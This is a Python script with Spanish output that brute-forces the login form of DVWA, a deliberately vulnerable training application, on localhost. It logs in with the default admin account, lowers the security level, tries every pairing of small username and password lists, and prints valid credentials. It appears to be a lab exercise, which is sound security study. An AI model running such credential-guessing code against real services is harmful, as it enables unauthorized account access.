import requests
import time

TARGET_URL = "http://localhost:8060/vulnerabilities/brute/"
LOGIN_URL  = "http://localhost:8060/login.php"

DVWA_USER = "admin"
DVWA_PASS = "password"

USERNAMES  = ["admin", "user4", "user5", "hola", "valentina"]
PASSWORDS  = ["password", "criptografia123", "seguridad123", "carlosgracias", "marafiona"]

SUCCESS_MARKER = "Welcome to the password protected area"


def get_dvwa_session() -> requests.Session:
    session = requests.Session()

    r     = session.get(LOGIN_URL)
    token = extract_token(r.text)

    session.post(LOGIN_URL, data={
        "username":   DVWA_USER,
        "password":   DVWA_PASS,
        "Login":      "Login",
        "user_token": token,
    })

    session.post(
        "http://localhost:8060/security.php",
        data={"security": "low", "seclev_submit": "Submit"},
    )
    return session


def extract_token(html: str) -> str | None:
    marker = "name='user_token' value='"
    idx = html.find(marker)
    if idx == -1:
        return None
    start = idx + len(marker)
    return html[start:html.find("'", start)]


def brute_force(session: requests.Session) -> list[tuple[str, str]]:
    found = []
    total = len(USERNAMES) * len(PASSWORDS)
    count = 0

    print(f"\n{'='*50}")
    print(f"  Iniciando fuerza bruta — {total} combinaciones")
    print(f"{'='*50}\n")

    for username in USERNAMES:
        for password in PASSWORDS:
            count += 1
            r = session.get(TARGET_URL, params={
                "username": username,
                "password": password,
                "Login":    "Login",
            }, timeout=5)

            if SUCCESS_MARKER in r.text:
                print(f"  [+] VÁLIDO  →  {username}:{password}  (intento {count}/{total})")
                found.append((username, password))
            else:
                print(f"  [-] {count:>2}/{total}  {username}:{password}")

    return found


if __name__ == "__main__":
    t0 = time.time()

    print("[*] Abriendo sesión en DVWA...")
    session = get_dvwa_session()
    print(f"[*] PHPSESSID: {session.cookies.get('PHPSESSID', 'n/d')}")

    found = brute_force(session)

    print(f"\n{'='*50}")
    print("  CREDENCIALES VÁLIDAS")
    print(f"{'='*50}")
    for u, p in found:
        print(f"  ✓  {u}:{p}")
    print(f"\n  Tiempo total: {time.time() - t0:.2f}s")
    print(f"{'='*50}\n")
